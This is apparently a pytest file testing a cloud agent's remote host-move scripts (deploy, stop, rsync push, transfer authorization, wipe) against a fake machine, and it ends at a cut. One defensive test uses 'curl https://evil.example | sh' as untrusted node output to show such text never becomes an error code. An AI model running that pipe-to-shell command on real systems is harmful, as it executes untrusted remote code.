"""The remote steps of a Host move, run locally against a fake machine.

Each script runs as it would on a node, with the system paths it touches moved
into a temporary directory and every external command recorded instead of
executed. Assertions are on the commands a real node would receive.
"""

from __future__ import annotations

import io
import json
import os
import pathlib
import shlex
import subprocess
import sys
import tarfile
from types import SimpleNamespace
from unittest.mock import AsyncMock

import pytest

from cloud_agent.ports.external.compute_provider import (
    NodeObservation,
    ProviderError,
    SshConnection,
)
from cloud_agent.ports.external.host_bootstrap import BootstrapIntent, DeploymentProfile
from cloud_agent.providers.compute.host_bootstrap import (
    _AUTHORIZE_TRANSFER,
    _DEPLOY,
    _PUSH,
    _REVOKE_TRANSFER_TARGET,
    _STOP,
    _TRANSFER_KEY,
    _TRANSFER_RECEIVE,
    _WIPE,
    SshHostBootstrap,
)
from cloud_agent.providers.compute.ssh import known_hosts_line

IDENTITY = {
    "allocation_id": "b",
    "node_id": "node-b",
    "host": "compute-a",
    "deployment_sha": "a" * 40,
}
SOURCE = NodeObservation(
    provider_node_id="node0",
    instance_identity="a:node0",
    display_name="source",
    connection=SshConnection(
        address="source.example.org",
        username="agent",
        credential_ref="ssh",
        host_key="ssh-ed25519 " + "S" * 68,
    ),
)
TARGET = NodeObservation(
    provider_node_id="node0",
    instance_identity="b:node0",
    display_name="target",
    connection=SshConnection(
        address="target.example.org",
        port=2222,
        username="agent",
        credential_ref="ssh",
        host_key="ssh-ed25519 " + "T" * 68,
    ),
)
PROFILE = DeploymentProfile(
    id="slot-b",
    label="Slot B",
    source_bundle="/unused",
    source_sha256="a" * 64,
    deployment_sha="a" * 40,
    environment_ref="deployment:env",
    data_mount="/mydata",
)
INTENT = BootstrapIntent(
    operation_id="op",
    allocation_id="b",
    node_id="node-b",
    host="compute-a",
    namespace="ca-nodea",
)


class Machine:
    """A recorded node: mounts, daemons and containers driven by command fakes."""

    def __init__(self, root: pathlib.Path) -> None:
        self.root = root
        self.calls: list[list[str]] = []
        self.mounted: set[str] = {"/mydata"}
        self.bind_sources: dict[str, str] = {}
        self.containers: list[str] = []
        self.images: list[str] = []
        self.volumes: list[str] = []
        self.runner: list[str] = []
        self.sandbox_manager: list[str] = []
        self.sandbox_manager_service = "sandbox-manager"
        # Sandboxes the sandbox manager stops itself while it shuts down.
        self.sandbox_manager_stops: list[str] = []
        self.active = {"docker": True, "containerd": True}
        self.rsync_codes: list[int] = []
        self.environments: list[dict[str, str]] = []
        self.units = {
            service: {
                "LoadState": "loaded",
                "ExecStart": f"{{ path=/usr/bin/{daemon} ; argv[]=/usr/bin/{daemon} ; ignore_errors=no ; }}",
                "MainPID": "0",
            }
            for service, daemon in (("docker", "dockerd"), ("containerd", "containerd"))
        }
        self.units.update(
            {
                f"var-lib-{name}.mount": {
                    "LoadState": "not-found",
                    "FragmentPath": "",
                    "DropInPaths": "",
                }
                for name in ("docker", "containerd")
            }
        )

    def logical(self, value: str) -> str:
        """Map redirected paths back to the node paths they stand for."""
        return value.replace(str(self.root), "")

    def run(self, args, **kwargs):
        args = [self.logical(str(arg)) for arg in args]
        self.calls.append(args)
        if "env" in kwargs:
            self.environments.append(kwargs["env"].copy())
        out = ""
        code = 0
        if args[:2] == ["mountpoint", "-q"]:
            code = 0 if args[2] in self.mounted else 1
        elif args[:2] == ["mount", "--bind"]:
            self.mounted.add(args[3])
            self.bind_sources[args[3]] = args[2]
        elif args[:2] == ["docker", "ps"]:
            if not self.active["docker"]:
                return subprocess.CompletedProcess(args, 1, "", "daemon stopped")
            if "label=com.docker.compose.service=runner" in args:
                out = "\n".join(self.runner)
            elif any(
                f"label=com.docker.compose.service={name}" in args
                for name in ("sandbox-manager", "workspace-broker")
            ):
                if f"label=com.docker.compose.service={self.sandbox_manager_service}" in args:
                    out = "\n".join(self.sandbox_manager)
            else:
                out = "\n".join(self.containers)
        elif args[:3] == ["docker", "image", "ls"]:
            out = "\n".join(self.images)
        elif args[:3] == ["docker", "volume", "ls"]:
            out = "\n".join(self.volumes)
        elif args[:2] == ["docker", "stop"]:
            stopped = set(args[2:])
            if stopped & set(self.sandbox_manager):
                stopped |= set(self.sandbox_manager_stops)
            self.runner = [c for c in self.runner if c not in stopped]
            self.sandbox_manager = [c for c in self.sandbox_manager if c not in stopped]
            self.containers = [c for c in self.containers if c not in stopped]
        elif args[:2] == ["systemctl", "stop"]:
            for name in args[2:]:
                if name in self.active:
                    self.active[name] = False
        elif args[:2] == ["systemctl", "start"]:
            for name in args[2:]:
                if name in self.active:
                    self.active[name] = True
        elif args[:3] == ["systemctl", "is-active", "--quiet"]:
            code = 0 if self.active.get(args[3]) else 3
        elif args[:2] == ["systemctl", "show"]:
            out = "\n".join(f"{key}={value}" for key, value in self.units[args[2]].items())
        elif args[:2] == ["pgrep", "-x"]:
            code = 1
        elif args[0] == "rsync":
            code = self.rsync_codes.pop(0) if self.rsync_codes else 0
            out = "Total transferred file size: 1,000 bytes\n"
        if kwargs.get("capture_output"):
            return subprocess.CompletedProcess(
                args, code, out if kwargs.get("text") else out.encode(), ""
            )
        return subprocess.CompletedProcess(args, code)


@pytest.fixture
def machine(tmp_path, monkeypatch):
    node = tmp_path / "node"
    node.mkdir()
    fake = Machine(node)
    original = pathlib.Path

    def path(value="", *rest):
        value = str(value)
        if value.startswith(
            (
                "/var/lib",
                "/etc/",
                "/mydata",
                "/proc",
                "/run/systemd/",
                "/usr/local/lib/systemd/",
                "/usr/lib/systemd/",
                "/lib/systemd/",
            )
        ):
            return original(str(node) + value, *rest)
        return original(value, *rest)

    monkeypatch.setattr("pathlib.Path", path)
    monkeypatch.setattr("subprocess.run", fake.run)
    monkeypatch.setattr("shutil.which", lambda name: None)
    original_samefile = os.path.samefile

    def samefile(source, target):
        if fake.bind_sources.get(fake.logical(str(target))) == fake.logical(str(source)):
            return True
        return original_samefile(source, target)

    monkeypatch.setattr("os.path.samefile", samefile)
    for directory in ("mydata", "etc", "var/lib"):
        (node / directory).mkdir(parents=True)
    return fake


def run_remote(script, params, monkeypatch, capsys, *, stdin: bytes | None = None) -> dict:
    monkeypatch.setattr("sys.argv", ["remote", json.dumps(params)])
    if stdin is not None:
        monkeypatch.setattr("sys.stdin", SimpleNamespace(buffer=io.BytesIO(stdin)))
    try:
        exec(script, {})
    except SystemExit as exc:
        if exc.code not in (0, None):
            raise
    lines = capsys.readouterr().out.strip().splitlines()
    return json.loads(lines[-1])


def payload() -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        data = b"COMPOSE_PROJECT='ca-nodea'\nAGENT_ENROLL_TOKEN='token'\n"
        member = tarfile.TarInfo(".env")
        member.size, member.mode = len(data), 0o600
        archive.addfile(member, io.BytesIO(data))
    return buffer.getvalue()


def deploy_params(root, **overrides):
    return {
        "root": str(root),
        "sha": "a" * 40,
        "install": True,
        "activate": True,
        "reenroll": False,
        "data_mount": "/mydata",
        "project": "ca-nodea",
        "identity": IDENTITY,
        **overrides,
    }


def test_staging_mounts_state_on_the_data_disk_and_starts_nothing(
    tmp_path, machine, monkeypatch, capsys
):
    result = run_remote(
        _DEPLOY,
        deploy_params(tmp_path / "deploy", activate=False),
        monkeypatch,
        capsys,
        stdin=payload(),
    )
    assert result == {"ready": True, "blocked_reasons": []}
    mounts = [call for call in machine.calls if call[:2] == ["mount", "--bind"]]
    assert mounts == [
        ["mount", "--bind", "/mydata/docker", "/var/lib/docker"],
        ["mount", "--bind", "/mydata/containerd", "/var/lib/containerd"],
    ]
    install = next(call for call in machine.calls if call[:2] == ["apt-get", "install"])
    assert "rsync" in install
    assert machine.calls.index(mounts[-1]) < machine.calls.index(install)
    assert ["bash", "deploy/host/sandbox_host.sh", "up"] not in machine.calls
    fstab = [
        machine.logical(line) for line in (machine.root / "etc/fstab").read_text().splitlines()
    ]
    assert fstab == [
        "/mydata/docker /var/lib/docker none bind,nofail,x-systemd.requires-mounts-for=/mydata 0 0",
        "/mydata/containerd /var/lib/containerd none bind,nofail,x-systemd.requires-mounts-for=/mydata 0 0",
    ]
    for name in ("docker", "containerd"):
        dropin = machine.root / f"etc/systemd/system/{name}.service.d/cloud-agent-storage.conf"
        assert machine.logical(dropin.read_text()) == (
            f"[Unit]\nRequiresMountsFor=/mydata /var/lib/{name}\n"
        )
    assert machine.calls.index(["systemctl", "daemon-reload"]) < machine.calls.index(install)
    # A repeated stage neither mounts twice nor duplicates the fstab entries.
    run_remote(
        _DEPLOY,
        deploy_params(tmp_path / "deploy", activate=False),
        monkeypatch,
        capsys,
        stdin=payload(),
    )
    assert len([call for call in machine.calls if call[:2] == ["mount", "--bind"]]) == 2
    assert len((machine.root / "etc/fstab").read_text().splitlines()) == 2


def test_state_is_never_mounted_over_existing_containers(tmp_path, machine, monkeypatch, capsys):
    (machine.root / "var/lib/docker").mkdir(parents=True)
    (machine.root / "var/lib/docker/engine-id").write_text("x")
    monkeypatch.setattr("shutil.which", lambda name: "/usr/bin/docker")
    machine.containers = ["retained"]
    result = run_remote(
        _DEPLOY, deploy_params(tmp_path / "deploy"), monkeypatch, capsys, stdin=payload()
    )
    assert result == {"ready": False, "blocked_reasons": ["data_mount_conflict"]}
    assert not [call for call in machine.calls if call[0] == "mount"]
    assert (machine.root / "var/lib/docker/engine-id").exists()


def test_initial_docker_metadata_is_preserved_and_requires_operator_cleanup(
    tmp_path, machine, monkeypatch, capsys
):
    (machine.root / "var/lib/docker/network").mkdir(parents=True)
    monkeypatch.setattr("shutil.which", lambda name: "/usr/bin/docker")
    result = run_remote(
        _DEPLOY,
        deploy_params(tmp_path / "deploy", activate=False),
        monkeypatch,
        capsys,
        stdin=payload(),
    )
    assert result == {"ready": False, "blocked_reasons": ["data_mount_conflict"]}
    assert (machine.root / "var/lib/docker/network").exists()
    assert not [
        call
        for call in machine.calls
        if call[0] in {"docker", "mount", "systemctl"} and call[:2] != ["systemctl", "show"]
    ]


def test_non_docker_containerd_state_is_preserved_even_when_docker_is_empty(
    tmp_path, machine, monkeypatch, capsys
):
    (machine.root / "var/lib/docker/network").mkdir(parents=True)
    state = machine.root / "var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db"
    state.parent.mkdir(parents=True)
    state.write_bytes(b"k8s.io workload state")
    monkeypatch.setattr("shutil.which", lambda name: "/usr/bin/docker")
    result = run_remote(
        _DEPLOY, deploy_params(tmp_path / "deploy"), monkeypatch, capsys, stdin=payload()
    )
    assert result == {"ready": False, "blocked_reasons": ["data_mount_conflict"]}
    assert state.read_bytes() == b"k8s.io workload state"
    assert (machine.root / "var/lib/docker/network").exists()
    assert not [
        call
        for call in machine.calls
        if call[0] in {"mount", "systemctl", "apt-get"} and call[:2] != ["systemctl", "show"]
    ]


@pytest.mark.parametrize("store", ["docker", "containerd"])
def test_store_state_created_during_inspection_is_preserved(
    tmp_path, machine, monkeypatch, capsys, store
):
    original_run = machine.run
    state = machine.root / f"var/lib/{store}/meta.db"

    def run(args, **kwargs):
        if args[:2] == ["systemctl", "stop"]:
            state.write_bytes(b"concurrent daemon state")
        return original_run(args, **kwargs)

    monkeypatch.setattr("subprocess.run", run)
    result = run_remote(
        _DEPLOY, deploy_params(tmp_path / "deploy"), monkeypatch, capsys, stdin=payload()
    )
    assert result == {"ready": False, "blocked_reasons": ["data_mount_conflict"]}
    assert state.read_bytes() == b"concurrent daemon state"
    assert machine.active == {"docker": True, "containerd": True}
    assert ["systemctl", "start", "docker", "containerd"] in machine.calls
    assert not [call for call in machine.calls if call[0] in {"mount", "apt-get"}]


@pytest.mark.parametrize(
    ("docker_active", "daemon_root"),
    [(False, "/var/lib/docker"), (True, "/other-disk/docker")],
)
def test_nonempty_unbound_store_never_activates_or_queries_an_unrelated_daemon(
    tmp_path, machine, monkeypatch, capsys, docker_active, daemon_root
):
    state = machine.root / "var/lib/docker/retained-state"
    state.parent.mkdir(parents=True)
    state.write_bytes(b"retained sandbox data")
    machine.active = {"docker.socket": True, "docker": docker_active, "containerd": False}
    machine.daemon_root = daemon_root
    original_run = machine.run
    activations = []

    def run(args, **kwargs):
        if args[0] == "docker" and not machine.active["docker"]:
            activations.append("socket activated")
            machine.active["docker"] = True
        return original_run(args, **kwargs)

    monkeypatch.setattr("subprocess.run", run)
    monkeypatch.setattr("shutil.which", lambda name: "/usr/bin/docker")
    result = run_remote(
        _DEPLOY, deploy_params(tmp_path / "deploy"), monkeypatch, capsys, stdin=payload()
    )
    assert result == {"ready": False, "blocked_reasons": ["data_mount_conflict"]}
    assert state.read_bytes() == b"retained sandbox data"
    assert not activations
    assert machine.active["docker"] is docker_active
    assert not [
        call
        for call in machine.calls
        if call[0] in {"docker", "systemctl", "mount"} and call[:2] != ["systemctl", "show"]
    ]


def test_correctly_bound_existing_stores_are_retained_without_inventory(
    tmp_path, machine, monkeypatch, capsys
):
    retained = []
    for store in ("docker", "containerd"):
        source = machine.root / f"mydata/{store}"
        target = machine.root / f"var/lib/{store}"
        source.mkdir()
        target.mkdir()
        for directory in (source, target):
            state = directory / "retained-state"
            state.write_bytes(b"existing user data")
            retained.append(state)
        machine.mounted.add(f"/var/lib/{store}")
        machine.bind_sources[f"/var/lib/{store}"] = f"/mydata/{store}"
    root = tmp_path / "deploy"
    root.mkdir()
    (root / ".compute-identity.json").write_text(json.dumps(IDENTITY))
    result = run_remote(
        _DEPLOY,
        deploy_params(root, activate=False, install=False),
        monkeypatch,
        capsys,
        stdin=payload(),
    )
    assert result == {"ready": True, "blocked_reasons": []}
    assert all(state.read_bytes() == b"existing user data" for state in retained)
    assert not [call for call in machine.calls if call[0] in {"docker", "mount"}]
    assert not [
        call
        for call in machine.calls
        if call[:2] in (["systemctl", "stop"], ["systemctl", "start"])
    ]


@pytest.mark.parametrize(
    "readonly_path",
    ["/mydata", "/mydata/docker", "/mydata/containerd", "/var/lib/docker", "/var/lib/containerd"],
)
def test_readonly_disk_or_bind_blocks_before_any_filesystem_or_service_mutation(
    tmp_path, machine, monkeypatch, capsys, readonly_path
):
    path = machine.root / readonly_path.lstrip("/")
    path.mkdir(parents=True, exist_ok=True)
    if readonly_path == "/var/lib/docker":
        (machine.root / "mydata/docker").mkdir()
        (path / "retained-state").write_bytes(b"user data on read-only bind")
        machine.mounted.add(readonly_path)
        machine.bind_sources[readonly_path] = "/mydata/docker"
    original_statvfs = os.statvfs

    def statvfs(path):
        if machine.logical(str(path)) == readonly_path:
            return SimpleNamespace(f_flag=os.ST_RDONLY)
        return original_statvfs(path)

    def snapshot():
        return {
            path: None if path.is_dir() else path.read_bytes() for path in machine.root.rglob("*")
        }

    before = snapshot()
    monkeypatch.setattr("os.statvfs", statvfs)
    deploy_root = tmp_path / "deploy"
    result = run_remote(_DEPLOY, deploy_params(deploy_root), monkeypatch, capsys, stdin=payload())
    assert result == {"ready": False, "blocked_reasons": ["data_mount_unavailable"]}
    assert snapshot() == before
    assert not deploy_root.exists()
    assert not (tmp_path / ".deploy.compute-lock").exists()
    assert not [
        call for call in machine.calls if call[0] in {"docker", "systemctl", "mount", "apt-get"}
    ]


def test_an_existing_volume_is_never_hidden_by_the_selected_disk(
    tmp_path, machine, monkeypatch, capsys
):
    (machine.root / "var/lib/docker/volumes").mkdir(parents=True)
    monkeypatch.setattr("shutil.which", lambda name: "/usr/bin/docker")
    machine.volumes = ["user-data"]
    result = run_remote(
        _DEPLOY, deploy_params(tmp_path / "deploy"), monkeypatch, capsys, stdin=payload()
    )
    assert result == {"ready": False, "blocked_reasons": ["data_mount_conflict"]}
    assert not [call for call in machine.calls if call[0] == "mount"]
    assert (machine.root / "var/lib/docker/volumes").exists()


def test_a_missing_data_disk_blocks_before_anything_is_installed(
    tmp_path, machine, monkeypatch, capsys
):
    machine.mounted.clear()
    result = run_remote(
        _DEPLOY, deploy_params(tmp_path / "deploy"), monkeypatch, capsys, stdin=payload()
    )
    assert result == {"ready": False, "blocked_reasons": ["data_mount_unavailable"]}
    assert not [call for call in machine.calls if call[0] == "apt-get"]


def test_an_existing_mount_on_another_disk_blocks_setup(tmp_path, machine, monkeypatch, capsys):
    (machine.root / "var/lib/docker").mkdir(parents=True)
    (machine.root / "var/lib/docker/retained-data").write_text("keep")
    machine.mounted.add("/var/lib/docker")
    result = run_remote(
        _DEPLOY, deploy_params(tmp_path / "deploy"), monkeypatch, capsys, stdin=payload()
    )
    assert result == {"ready": False, "blocked_reasons": ["data_mount_conflict"]}
    assert not [call for call in machine.calls if call[0] in {"mount", "apt-get"}]
    assert (machine.root / "var/lib/docker/retained-data").read_text() == "keep"


def test_a_storage_path_through_a_symlink_blocks_setup(tmp_path, machine, monkeypatch, capsys):
    (machine.root / "mydata/real/disk").mkdir(parents=True)
    (machine.root / "mydata/link").symlink_to(machine.root / "mydata/real")
    machine.mounted.add("/mydata/link/disk")
    result = run_remote(
        _DEPLOY,
        deploy_params(tmp_path / "deploy", data_mount="/mydata/link/disk"),
        monkeypatch,
        capsys,
        stdin=payload(),
    )
    assert result == {"ready": False, "blocked_reasons": ["data_mount_unavailable"]}
    assert not [call for call in machine.calls if call[0] in {"mount", "apt-get"}]


@pytest.mark.parametrize("reenroll", [False, True])
def test_only_explicit_reenrollment_discards_the_persisted_credential(
    tmp_path, machine, monkeypatch, capsys, reenroll
):
    credential = machine.root / "var/lib/cloud-agent/compute-a/credential"
    credential.parent.mkdir(parents=True)
    credential.write_text("revoked")
    machine.active = {"docker": False, "containerd": False}
    result = run_remote(
        _DEPLOY,
        deploy_params(tmp_path / "deploy", install=False, reenroll=reenroll),
        monkeypatch,
        capsys,
        stdin=payload(),
    )
    assert result["ready"]
    assert credential.exists() is (not reenroll)
    if not reenroll:
        assert credential.read_text() == "revoked"
    start = machine.calls.index(["systemctl", "start", "containerd", "docker"])
    assert start < machine.calls.index(["bash", "deploy/host/sandbox_host.sh", "up"])


def _stop_params(root: pathlib.Path) -> dict:
    return {
        "root": str(root),
        "project": "ca-nodea",
        "identity": IDENTITY,
        "sandbox_manager_drain_seconds": 600,
    }


@pytest.mark.parametrize("service_name", ["sandbox-manager", "workspace-broker"])
def test_stop_halts_the_runner_then_lets_the_sandbox_manager_stop_its_sandboxes(
    tmp_path, machine, monkeypatch, capsys, service_name
):
    root = tmp_path / "deploy"
    root.mkdir()
    (root / ".compute-identity.json").write_text(json.dumps(IDENTITY))
    machine.runner = ["runner-1"]
    machine.sandbox_manager_service = service_name
    manager_id = f"{service_name}-1"
    machine.sandbox_manager = [manager_id]
    machine.sandbox_manager_stops = ["chat-1"]
    machine.containers = ["runner-1", "chat-1", manager_id, "tunnel-1"]
    result = run_remote(_STOP, _stop_params(root), monkeypatch, capsys)
    assert result == {"stopped": True, "reason": None}
    stops = [
        call for call in machine.calls if call[:2] in (["docker", "stop"], ["systemctl", "stop"])
    ]
    # Docker never stops a sandbox the sandbox manager could still stop cleanly.
    assert stops == [
        ["docker", "stop", "-t", "60", "runner-1"],
        ["docker", "stop", "-t", "600", manager_id],
        ["docker", "stop", "tunnel-1"],
        ["systemctl", "stop", "docker.socket", "docker", "containerd"],
    ]
    for service in ("runner", "sandbox-manager", "workspace-broker"):
        query = next(
            call for call in machine.calls if f"label=com.docker.compose.service={service}" in call
        )
        assert "label=com.docker.compose.project=ca-nodea" in query
    # The shim check matches process names, never this script's own command line.
    assert ["pgrep", "-x", "containerd-shim"] in machine.calls


@pytest.mark.parametrize("service_name", ["sandbox-manager", "workspace-broker"])
def test_stop_still_halts_sandboxes_the_sandbox_manager_left_running(
    tmp_path, machine, monkeypatch, capsys, service_name
):
    root = tmp_path / "deploy"
    root.mkdir()
    (root / ".compute-identity.json").write_text(json.dumps(IDENTITY))
    machine.runner = ["runner-1"]
    machine.sandbox_manager_service = service_name
    manager_id = f"{service_name}-1"
    machine.sandbox_manager = [manager_id]
    machine.containers = ["runner-1", "chat-1", manager_id, "tunnel-1"]
    result = run_remote(_STOP, _stop_params(root), monkeypatch, capsys)
    assert result == {"stopped": True, "reason": None}
    assert ["docker", "stop", "chat-1", "tunnel-1"] in machine.calls
    assert machine.containers == []


def test_stop_refuses_another_deployment(tmp_path, machine, monkeypatch, capsys):
    root = tmp_path / "deploy"
    root.mkdir()
    (root / ".compute-identity.json").write_text(json.dumps({**IDENTITY, "host": "other"}))
    result = run_remote(
        _STOP, {"root": str(root), "project": "x", "identity": IDENTITY}, monkeypatch, capsys
    )
    assert result == {"stopped": False, "reason": "deployment_identity_conflict"}
    assert not [call for call in machine.calls if call[0] in {"docker", "systemctl"}]


def _push(
    machine, monkeypatch, capsys, *, final: bool, codes: list[int]
) -> tuple[dict, list[list[str]]]:
    large = {
        "/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots": ["1", "2", "3"],
        "/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256": ["aa", "bb"],
    }
    work = machine.root / "var/lib/cloud-agent-transfer"
    work.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr("os.path.isdir", lambda path: path in large)
    monkeypatch.setattr("os.listdir", lambda path: large[path])
    machine.rsync_codes = list(codes)
    machine.calls.clear()
    params = {
        "address": "target.example.org",
        "port": 2222,
        "user": "agent",
        "final": final,
        "streams": 2,
    }
    result = run_remote(
        _PUSH, params, monkeypatch, capsys, stdin=b"[target.example.org]:2222 ssh-ed25519 T\n"
    )
    assert (work / "known_hosts").read_bytes() == b"[target.example.org]:2222 ssh-ed25519 T\n"
    return result, [call for call in machine.calls if call[0] == "rsync"]


def test_final_copy_deletes_what_the_source_dropped_and_stays_on_the_data_disk(
    machine, monkeypatch, capsys
):
    result, rsyncs = _push(machine, monkeypatch, capsys, final=True, codes=[])
    assert result == {"copied": True, "bytes": 7000, "streams": 2}
    cleanup = [call for call in rsyncs if call[1] == "-dlptgoD"]
    [rest] = [call for call in rsyncs if "/var/lib/docker" in call]
    chunks = [call for call in rsyncs if any(arg.startswith("--files-from=") for arg in call)]
    assert (len(cleanup), len(chunks), len(rsyncs)) == (2, 4, 7)
    # Removed entries are reconciled before the parallel streams start.
    assert rsyncs[:2] == cleanup
    for call in rsyncs:
        assert "-HAXSx" in call and "--numeric-ids" in call and "--delete" in call
        ssh = call[call.index("-e") + 1]
        assert "StrictHostKeyChecking=yes" in ssh and "-p 2222" in ssh
        assert "UserKnownHostsFile=/var/lib/cloud-agent-transfer/known_hosts" in ssh
        assert "--rsync-path=sudo -n rsync" in call
    # One level of each large directory, without recursion.
    assert all(
        call[-1].startswith("agent@target.example.org:/var/lib/containerd/") for call in cleanup
    )
    assert rest[-3:] == [
        "/var/lib/docker",
        "/var/lib/containerd",
        "agent@target.example.org:/var/lib/",
    ]
    assert "/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/*" in rest
    assert all(
        "-r" in chunk and any(arg.startswith("--files-from=") for arg in chunk) for chunk in chunks
    )


def test_a_copy_of_a_running_source_tolerates_vanished_files_but_the_final_copy_does_not(
    machine, monkeypatch, capsys
):
    copied, rsyncs = _push(machine, monkeypatch, capsys, final=False, codes=[24, 0, 0, 0, 0])
    assert copied["copied"]
    assert not any("--delete" in call for call in rsyncs)
    final, _ = _push(machine, monkeypatch, capsys, final=True, codes=[0, 0, 24])
    assert not final["copied"]


def test_target_accepts_the_transfer_key_once_and_empties_only_on_the_first_copy(
    tmp_path, monkeypatch, capsys
):
    calls = []
    marker = json.dumps(IDENTITY)

    def run(args, **kwargs):
        calls.append(list(args))
        if args[:3] == ["sudo", "-n", "cat"]:
            return subprocess.CompletedProcess(args, 0, marker, "")
        return subprocess.CompletedProcess(args, 0)

    monkeypatch.setattr("subprocess.run", run)
    monkeypatch.setenv("HOME", str(tmp_path))
    params = {
        "key": "ssh-ed25519 KEY ca-transfer",
        "source": "192.0.2.10",
        "first": True,
        "root": "/opt/agent",
        "identity": IDENTITY,
    }
    assert run_remote(_AUTHORIZE_TRANSFER, params, monkeypatch, capsys) == {"authorized": True}
    deletes = [call for call in calls if "-delete" in call]
    assert deletes == [
        ["sudo", "-n", "find", "/var/lib/docker", "-xdev", "-mindepth", "1", "-delete"],
        ["sudo", "-n", "find", "/var/lib/containerd", "-xdev", "-mindepth", "1", "-delete"],
    ]
    calls.clear()
    run_remote(_AUTHORIZE_TRANSFER, {**params, "first": False}, monkeypatch, capsys)
    assert not [call for call in calls if "-delete" in call]
    keys = (tmp_path / ".ssh/authorized_keys").read_text().splitlines()
    receive = tmp_path / ".ssh/ca-transfer-receive"
    assert keys == [
        f'restrict,from="192.0.2.10",command="{sys.executable} -I {receive}" '
        "ssh-ed25519 KEY ca-transfer"
    ]
    assert receive.read_text() == _TRANSFER_RECEIVE and receive.stat().st_mode & 0o777 == 0o700
    marker = json.dumps({**IDENTITY, "host": "other"})
    refused = run_remote(_AUTHORIZE_TRANSFER, params, monkeypatch, capsys)
    assert refused == {"authorized": False, "reason": "deployment_identity_conflict"}


def test_wipe_removes_the_old_copy_and_leaves_an_empty_running_daemon(
    tmp_path, machine, monkeypatch, capsys
):
    root = tmp_path / "deploy"
    root.mkdir()
    (root / ".compute-identity.json").write_text(json.dumps(IDENTITY))
    for name in ("docker", "containerd"):
        (machine.root / "var/lib" / name).mkdir(parents=True)
    state = machine.root / "var/lib/cloud-agent/compute-a"
    state.mkdir(parents=True)
    (state / "credential").write_text("old")
    result = run_remote(_WIPE, {"root": str(root), "identity": IDENTITY}, monkeypatch, capsys)
    assert result == {"wiped": True}
    assert ["find", "/var/lib/docker", "-xdev", "-mindepth", "1", "-delete"] in machine.calls
    assert not state.exists()
    assert machine.calls[-1] == ["systemctl", "start", "containerd", "docker"]
    (root / ".compute-identity.json").write_text(json.dumps({**IDENTITY, "host": "other"}))
    assert run_remote(_WIPE, {"root": str(root), "identity": IDENTITY}, monkeypatch, capsys) == {
        "wiped": False,
        "reason": "deployment_identity_conflict",
    }


async def test_transfer_pushes_from_the_source_and_pins_the_target_key():
    transport = AsyncMock()
    transport.run.side_effect = [
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKey ca-transfer\n",
        json.dumps({"authorized": True}),
        json.dumps({"copied": True, "bytes": 5, "streams": 6}),
    ]
    bootstrap = SshHostBootstrap(transport=transport, resolver=AsyncMock())
    result = await bootstrap.transfer(SOURCE, TARGET, PROFILE, INTENT, final=True, first=False)
    assert (result.bytes_transferred, result.streams) == (5, 6)
    key, authorize, push = transport.run.call_args_list
    assert key.args[0] == SOURCE.connection
    assert shlex.split(key.args[1])[-1] == _TRANSFER_KEY
    assert authorize.args[0] == TARGET.connection
    sent = json.loads(shlex.split(authorize.args[1])[-1])
    assert sent["first"] is False and sent["identity"]["namespace"] == "ca-nodea"
    assert sent["source"] == "source.example.org"
    assert push.args[0] == SOURCE.connection
    assert (
        push.kwargs["stdin"]
        == known_hosts_line("target.example.org", 2222, TARGET.connection.host_key).encode()
    )
    assert '"final": true' in push.args[1]


@pytest.mark.parametrize(
    ("outputs", "code"),
    [
        (["not a key"], "invalid_response"),
        (
            [
                "ssh-ed25519 AAAA ca-transfer",
                json.dumps({"authorized": False, "reason": "deployment_identity_conflict"}),
            ],
            "deployment_identity_conflict",
        ),
        (
            [
                "ssh-ed25519 AAAA ca-transfer",
                json.dumps({"authorized": True}),
                json.dumps({"copied": False}),
            ],
            "transfer_failed",
        ),
    ],
)
async def test_transfer_failures_are_reported_without_remote_output(outputs, code):
    transport = AsyncMock()
    transport.run.side_effect = outputs
    bootstrap = SshHostBootstrap(transport=transport, resolver=AsyncMock())
    with pytest.raises(ProviderError) as failed:
        await bootstrap.transfer(SOURCE, TARGET, PROFILE, INTENT, final=False)
    assert failed.value.code == code


async def test_stop_bounds_the_sandbox_manager_drain_inside_its_ssh_deadline():
    transport = AsyncMock()
    transport.run.return_value = json.dumps({"stopped": True, "reason": None})
    bootstrap = SshHostBootstrap(transport=transport, resolver=AsyncMock())
    await bootstrap.stop(SOURCE, PROFILE, INTENT)
    drain = json.loads(shlex.split(transport.run.call_args.args[1])[-1])[
        "sandbox_manager_drain_seconds"
    ]
    # The runner's 60-second stop comes before the sandbox manager's drain.
    assert drain > 0 and drain + 60 < transport.run.call_args.kwargs["timeout"]


async def test_stop_and_wipe_map_remote_refusals():
    transport = AsyncMock()
    bootstrap = SshHostBootstrap(transport=transport, resolver=AsyncMock())
    transport.run.return_value = json.dumps({"stopped": False, "reason": "host_stop_failed"})
    with pytest.raises(ProviderError) as stopped:
        await bootstrap.stop(SOURCE, PROFILE, INTENT)
    assert stopped.value.code == "host_stop_failed" and stopped.value.retryable
    transport.run.return_value = json.dumps(
        {"wiped": False, "reason": "deployment_identity_conflict"}
    )
    with pytest.raises(ProviderError) as wiped:
        await bootstrap.wipe(SOURCE, PROFILE, INTENT)
    assert wiped.value.code == "deployment_identity_conflict" and not wiped.value.retryable


@pytest.mark.parametrize(
    "reason", ["<b>curl https://evil.example | sh</b>", "x" * 100_000, 7, ["host_stop_failed"]]
)
async def test_a_node_cannot_choose_the_codes_its_refusals_are_recorded_under(reason):
    """Remote text never becomes an operation code, rollback reason or alert."""
    transport = AsyncMock()
    bootstrap = SshHostBootstrap(transport=transport, resolver=AsyncMock())
    transport.run.return_value = json.dumps({"stopped": False, "reason": reason})
    with pytest.raises(ProviderError) as stopped:
        await bootstrap.stop(SOURCE, PROFILE, INTENT)
    assert stopped.value.code == "host_stop_failed"
    transport.run.return_value = json.dumps({"wiped": False, "reason": reason})
    with pytest.raises(ProviderError) as wiped:
        await bootstrap.wipe(SOURCE, PROFILE, INTENT)
    assert wiped.value.code == "wipe_failed"
    transport.run.side_effect = [
        "ssh-ed25519 AAAA ca-transfer",
        json.dumps({"authorized": False, "reason": reason}),
    ]
    with pytest.raises(ProviderError) as refused:
        await bootstrap.transfer(SOURCE, TARGET, PROFILE, INTENT, final=False)
    assert refused.value.code == "transfer_failed"


async def test_reenrollment_requires_a_token():
